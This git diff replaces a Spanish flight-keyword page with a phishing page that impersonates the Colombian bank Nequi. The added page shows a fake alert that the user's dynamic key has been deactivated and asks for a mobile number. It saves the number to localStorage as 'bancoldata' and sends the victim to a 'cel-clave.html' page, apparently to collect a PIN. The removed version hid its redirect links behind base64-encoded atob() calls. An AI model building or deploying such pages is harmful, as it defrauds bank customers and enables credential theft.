@@ -1,359 +1,213 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Vuelos Futuristas — Palabras clave</title>
-  <style>
-    /* ===== RESET ===== */
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html,body { height: 100%; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ingreso</title>
 
-    /* ===== BODY / FONDO ===== */
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: radial-gradient(circle at top, #0a0a0a, #000000 70%);
-      color: #e6f7ff;
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #2b002b;
+      font-family: Arial, sans-serif;
+      color: white;
+      overflow: hidden; /* evita movimientos */
+    }
+
+    /* CONTENEDOR TIPO APP */
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
       display: flex;
       flex-direction: column;
+      justify-content: space-between;
+      height: 100dvh; /* evita saltos en móviles */
+      box-sizing: border-box;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
       align-items: center;
-      min-height: 100vh;
-      overflow-x: hidden;
-      padding: 20px;
     }
 
-    /* ===== AVION ANIMADO ===== */
-    .fondo-avion {
-      position: fixed;
-      top: 20%;
-      left: -120px;
-      width: 120px;
-      opacity: 0.12;
-      z-index: 0;
-      animation: volar 18s linear infinite;
-      pointer-events: none;
-    }
-    @keyframes volar {
-      from { transform: translateX(0) translateY(-20%); }
-      to   { transform: translateX(140vw) translateY(-20%); }
+    .help-icon {
+      width: 22px;
+      height: 22px;
+      border: 2px solid white;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 14px;
     }
 
-    /* ===== CONTENEDOR PRINCIPAL ===== */
-    .wrap {
-      width: 100%;
-      max-width: 980px;
-      z-index: 1;
-      display: grid;
-      grid-template-columns: 1fr 420px;
-      gap: 20px;
-      align-items: start;
+    .logo {
+      text-align: center;
+      font-size: 74px;
+      font-weight: bold;
+      position: relative;
     }
 
-    @media (max-width: 900px) {
-      .wrap { grid-template-columns: 1fr; padding-bottom: 40px; }
+    /* cuadrado arriba de la N */
+    .logo span {
+      color: #ff008c;
+      position: absolute;
+      top: 4px;
+      left: 40%;
+      transform: translateX(-85px);
+      font-size: 28px;
     }
 
-    /* ===== CARD PRINCIPAL ===== */
-    .card {
-      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
-      border: 1px solid rgba(0,255,255,0.06);
-      border-radius: 16px;
-      padding: 28px;
-      box-shadow: 0 8px 30px rgba(0,170,255,0.06);
-      backdrop-filter: blur(8px);
+    /* Mensaje agregado de clave dinámica */
+    .mensaje-clave {
+      background: rgba(255, 0, 140, 0.2);
+      border-left: 4px solid #ff008c;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 20px 0;
+      text-align: center;
+      font-size: 13px;
+      backdrop-filter: blur(4px);
     }
 
-    .title {
-      color: #00eaff;
-      font-size: 1.6rem;
-      text-shadow: 0 0 10px #00eaff;
-      margin-bottom: 8px;
-    }
-    .subtitle {
-      color: #cfeffb;
-      margin-bottom: 18px;
+    .form {
+      margin-bottom: 40px;
     }
 
-    /* ===== BOTONES PRINCIPALES ===== */
-    .actions {
-      display:flex;
-      gap:12px;
-      flex-wrap:wrap;
-      margin-bottom: 18px;
+    .input-box {
+      background: rgba(255,255,255,0.15);
+      border-radius: 10px;
+      padding: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      backdrop-filter: blur(6px);
     }
-    .btn {
-      background: linear-gradient(90deg,#00cfff,#0080ff);
-      color: #001;
+
+    .prefix {
+      color: #ffb3e6;
+      font-weight: bold;
+      border-right: 2px solid rgba(255,255,255,0.3);
+      padding-right: 10px;
+    }
+
+    .input-box input {
+      flex: 1;
       border: none;
-      padding: 12px 22px;
-      border-radius: 999px;
-      font-weight: 700;
-      box-shadow: 0 6px 20px rgba(0,170,255,0.18);
+      outline: none;
+      background: transparent;
+      color: white;
+      font-size: 16px;
+    }
+
+    .input-box input::placeholder {
+      color: #ddd;
+    }
+
+    .btn {
+      margin-top: 18px;
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      background: #ff008c;
+      color: white;
+      font-size: 16px;
       cursor: pointer;
-      transition: transform .18s ease, box-shadow .18s ease;
-    }
-    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,170,255,0.28); }
-
-    /* ===== PANEL DE KEYWORDS ===== */
-    .panel {
-      background: rgba(255,255,255,0.02);
-      border-radius: 12px;
-      padding: 16px;
-      border: 1px solid rgba(0,255,255,0.04);
-      max-height: 460px;
-      overflow: auto;
+      opacity: 0.5;
+      transition: 0.3s;
     }
 
-    .panel-header {
-      display:flex;
-      gap:10px;
-      align-items:center;
-      margin-bottom:12px;
-      flex-wrap:wrap;
+    .btn.active {
+      opacity: 1;
     }
 
-    .search {
-      flex:1;
-      min-width: 160px;
+    .btn:active {
+      transform: scale(0.97);
     }
-
-    .input {
-      width:100%;
-      padding:10px 12px;
-      border-radius:10px;
-      border:1px solid rgba(255,255,255,0.06);
-      background: rgba(0,0,0,0.4);
-      color: #e6f7ff;
-    }
-
-    .controls { display:flex; gap:8px; }
-
-    .copy-btn {
-      padding:8px 12px;
-      border-radius:10px;
-      border:1px solid rgba(0,255,255,0.08);
-      background: linear-gradient(90deg,#002a4d,#003b73);
-      color:#cfeffb;
-      cursor:pointer;
-      font-weight:600;
-    }
-    .copy-btn:hover{ filter:brightness(1.05); }
-
-    /* ===== TAGS ===== */
-    .tags {
-      display:flex;
-      gap:8px;
-      flex-wrap:wrap;
-    }
-    .tag {
-      background: linear-gradient(90deg, rgba(0,170,255,0.12), rgba(0,120,255,0.08));
-      padding:8px 12px;
-      border-radius: 999px;
-      color: #cfeffb;
-      font-weight:600;
-      font-size:0.95rem;
-      border:1px solid rgba(0,255,255,0.04);
-      cursor: default;
-      transition: transform .12s ease;
-    }
-    .tag:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,170,255,0.06); }
-
-    /* ===== SIDEBAR INFO ===== */
-    .sidebar {
-      display:flex;
-      flex-direction:column;
-      gap:16px;
-      position:sticky;
-      top:22px;
-      height: fit-content;
-    }
-
-    .info {
-      padding:14px;
-      border-radius:12px;
-      background: rgba(255,255,255,0.02);
-      border:1px solid rgba(0,255,255,0.04);
-    }
-    .info h4 { color:#00eaff; margin-bottom:6px; }
-    .meta { color:#bfefff; font-size:0.95rem; }
-
-    /* ===== FOOTER ===== */
-    footer {
-      margin-top: 28px;
-      color: #9fcfe6;
-      font-size: 0.9rem;
-      opacity: 0.95;
-    }
-
-    /* scrollbar small */
-    .panel::-webkit-scrollbar { height:8px; width:8px; }
-    .panel::-webkit-scrollbar-thumb { background: rgba(0,170,255,0.12); border-radius:8px; }
   </style>
 </head>
+
 <body>
 
-  <!-- avion animado -->
-  <img class="fondo-avion" src="https://cdn-icons-png.flaticon.com/512/69/69906.png" alt="avion">
+<div class="container">
 
-  <div class="wrap">
+  <header>
+    <div class="help-icon">?</div>
+    <div></div>
+  </header>
 
-    <!-- AREA PRINCIPAL -->
-    <div class="card">
-      <div class="title">✈ Vuelos Futuristas — Palabras clave</div>
-      <div class="subtitle">Lista optimizada de frases para tu campaña Google Ads. Usa búsqueda o copia todo para pegar en Keyword Planner.</div>
-
-  <a href="#" onclick="window.location.href=atob('aHR0cHM6Ly90aXF1dGVzYmFyYXRvLnZlcmNlbC5hcHAv')">
-          <button class="btn">✈ Cotizar</button>
-        </a>
-        <a href="#" onclick="window.location.href=atob('aHR0cHM6Ly90aXF1dGVzYmFyYXRvLnZlcmNlbC5hcHAv')">
-          <button class="btn">🛒 Reservar</button>
-        </a>
-      <!-- PANEL DE KEYWORDS -->
-      <div class="panel" id="panel">
-        <div class="panel-header">
-          <div class="search">
-            <input id="q" class="input" placeholder="Buscar palabra clave..." />
-          </div>
-          <div class="controls">
-            <button class="copy-btn" id="copyAll">Copiar todo</button>
-            <button class="copy-btn" id="copyVisible" title="Copia solo las visibles">Copiar visibles</button>
-          </div>
-        </div>
-
-        <div id="tags" class="tags">
-          <!-- Tags: se insertan desde JS -->
-        </div>
-      </div>
-    </div>
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-      <div class="info">
-        <h4>Consejos rápidos</h4>
-        <p class="meta">• Filtra por ciudad para crear grupos de anuncios.<br>
-        • Usa concordancias amplias + palabras negativas.<br>
-        • Verifica volumen con Keyword Planner (Colombia).</p>
-      </div>
-
-      <div class="info">
-        <h4>Top ciudades</h4>
-        <p class="meta">Bogotá, Medellín, Cartagena, Cali, San Andrés, Pereira, Bucaramanga, Santa Marta.</p>
-      </div>
-
-      <div class="info">
-        <h4>Formato listo</h4>
-        <p class="meta">Las frases están listas para copiar y pegar en Google Ads → <strong>Planificador de palabras clave</strong>.</p>
-      </div>
-    </aside>
-
+  <div class="logo">
+    <span>■</span>Nequi
   </div>
 
-  <footer>
-    © 2025 Vuelos Futuristas — Lista de palabras clave preparada para campaña Google Ads
-  </footer>
+  <!-- 🔽 MENSAJE AGREGADO (clave dinámica) 🔽 -->
+  <div class="mensaje-clave">
+    ⚠️ Tu clave dinámica de Nequi ha sido temporalmente desactivada por seguridad.<br>
+    Para reactivar tu clave dinámica, haz el proceso de verificación.
+  </div>
 
-  <script>
-    // ====== LISTA DE 40 PALABRAS (30 + 10 adicionales) ======
-    const keywords = [
-      "vuelos Bogotá Medellín baratos",
-      "tiquetes baratos Bogotá Cartagena",
-      "vuelos baratos Bogotá Cali",
-      "ofertas vuelos Medellín Santa Marta",
-      "promociones nacionales vuelos Colombia",
-      "vuelos low cost Bogotá San Andrés",
-      "tiquetes Medellín Cartagena baratos",
-      "vuelos Bogotá Bucaramanga baratos",
-      "vuelos Cali Medellín ofertas",
-      "vuelos baratos Pereira Bogotá",
-      "vuelos económicos nacional Colombia",
-      "vuelos baratos Cartagena Santa Marta",
-      "tiquetes baratos Bogotá Barranquilla",
-      "promociones vuelos Bogotá San Andrés",
-      "vuelos Bogotá Cúcuta ofertas",
-      "vuelos baratos Bucaramanga Medellín",
-      "vuelos Medellín Cali baratos",
-      "vuelos nacionales baratos Colombia",
-      "vuelos baratos Bogotá Pereira",
-      "tiquetes baratos destinos nacionales",
-      "ofertas vuelos Bogotá Montería",
-      "vuelos baratos Pereira Cartagena",
-      "vuelos baratos Medellín Bucaramanga",
-      "vuelos baratos Cali Santa Marta",
-      "promociones Bogotá Medellín ida y vuelta",
-      "vuelos baratos Colombia hoy",
-      "tiquetes baratos Medellín Pereira",
-      "vuelos Bogotá Santa Marta promoción",
-      "vuelos baratos destino nacional",
-      "ofertas vuelos Medellín San Andrés",
-      /* 10 adicionales */
-      "vuelos baratos a Cali desde Bogotá",
-      "promociones de tiquetes aéreos en Colombia",
-      "vuelos económicos a Cartagena todo el año",
-      "tiquetes baratos Pereira Medellín",
-      "vuelos nacionales en oferta hoy",
-      "tiquetes aéreos baratos Bogotá San Andrés",
-      "vuelos de última hora baratos Colombia",
-      "vuelos Medellín Santa Marta promociones",
-      "vuelos ida y regreso baratos Colombia",
-      "tiquetes baratos Cali Cartagena"
-    ];
+  <div class="form">
+    <div class="input-box">
+      <div class="prefix">+57</div>
+      <input type="tel" id="docInput" placeholder="Ingresa tu celular">
+    </div>
 
-    // ====== Mostrar tags ======
-    const tagsContainer = document.getElementById('tags');
-    function renderTags(list) {
-      tagsContainer.innerHTML = '';
-      list.forEach(k => {
-        const el = document.createElement('div');
-        el.className = 'tag';
-        el.textContent = k;
-        tagsContainer.appendChild(el);
-      });
-    }
-    renderTags(keywords);
+    <button class="btn" id="btn">Entra</button>
+  </div>
 
-    // ====== Buscador en vivo ======
-    const q = document.getElementById('q');
-    q.addEventListener('input', () => {
-      const v = q.value.trim().toLowerCase();
-      if (!v) { renderTags(keywords); return; }
-      const filtered = keywords.filter(k => k.toLowerCase().includes(v));
-      renderTags(filtered);
-    });
+</div>
 
-    // ====== Copiar funciones ======
-    function copyText(text) {
-      navigator.clipboard.writeText(text).then(() => {
-        alert('Copiado al portapapeles ✅');
-      }).catch(err => {
-        // fallback
-        const t = document.createElement('textarea');
-        t.value = text;
-        document.body.appendChild(t);
-        t.select();
-        try { document.execCommand('copy'); alert('Copiado al portapapeles ✅'); }
-        catch(e){ alert('Error al copiar: ' + e); }
-        t.remove();
-      });
-    }
+<script>
+const input = document.getElementById("docInput");
+const btn = document.getElementById("btn");
 
-    document.getElementById('copyAll').addEventListener('click', () => {
-      copyText(keywords.join('\n'));
-    });
+// VALIDACIÓN CELULAR COLOMBIA
+input.addEventListener("input", () => {
+  input.value = input.value.replace(/\D/g, "");
 
-    document.getElementById('copyVisible').addEventListener('click', () => {
-      // copiar solo las visibles (en el DOM actualmente)
-      const visible = Array.from(document.querySelectorAll('#tags .tag')).map(t => t.textContent);
-      if (visible.length === 0) { alert('No hay palabras visibles para copiar.'); return; }
-      copyText(visible.join('\n'));
-    });
+  if (input.value.length > 10) {
+    input.value = input.value.slice(0, 10);
+  }
 
-    // ====== Entrada: animar aparición de botones (opcional) ======
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        const panel = document.querySelector('.botones');
-        if (panel) panel.classList?.add('visible');
-      }, 700);
-    });
-  </script>
+  if (
+    input.value.length === 10 &&
+    input.value.startsWith("3")
+  ) {
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
+});
+
+// CLICK ORIGINAL (NO MODIFICADO)
+btn.addEventListener("click", () => {
+  const value = input.value.trim();
+
+  if (value.length !== 10 || !value.startsWith("3")) {
+    alert("Número de celular inválido");
+    return;
+  }
+
+  let data = {};
+  try {
+    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+  } catch {
+    data = {};
+  }
+
+  data.usuario = value;
+  data.fecha = new Date().toISOString();
+
+  localStorage.setItem("bancoldata", JSON.stringify(data));
+
+  window.location.href = "cel-clave.html";
+});
+</script>
+
 </body>
 </html>
